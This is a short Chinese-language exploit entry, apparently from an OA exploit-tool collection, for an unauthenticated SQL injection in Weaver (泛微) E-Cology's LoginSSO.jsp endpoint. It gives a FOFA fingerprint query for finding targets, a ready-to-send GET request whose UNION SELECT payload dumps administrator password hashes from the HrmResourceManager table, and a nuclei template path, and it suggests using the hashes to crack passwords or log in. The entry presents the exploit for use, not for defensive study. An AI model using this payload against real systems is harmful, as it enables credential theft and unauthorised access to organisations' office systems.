---
source: "LittleBear4/OA-EXPTOOL"
---

# 泛微OA LoginSSO.jsp SQL注入漏洞

## 漏洞描述

泛微OA E-Cology 的 `/upgrade/detail.jsp/login/LoginSSO.jsp` 接口中 `id` 参数存在SQL注入漏洞。攻击者无需登录，通过构造 UNION 查询语句即可直接读取数据库中 `HrmResourceManager` 表的 `password` 字段，获取用户密码哈希。

## 漏洞影响

```
泛微OA E-Cology
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

发送如下请求，`id` 参数拼接 UNION 查询：

```
GET /upgrade/detail.jsp/login/LoginSSO.jsp?id=1 UNION SELECT password as id from HrmResourceManager HTTP/1.1
```

响应中将回显 `HrmResourceManager` 表中的 password 字段值（管理员密码哈希），可进一步用于碰撞或登录。

参考 PoC（nuclei 模板，来源 LittleBear4/OA-EXPTOOL）：

```yaml
path:
  - "{{BaseURL}}/upgrade/detail.jsp/login/LoginSSO.jsp?id=1 UNION SELECT password as id from HrmResourceManager"
```
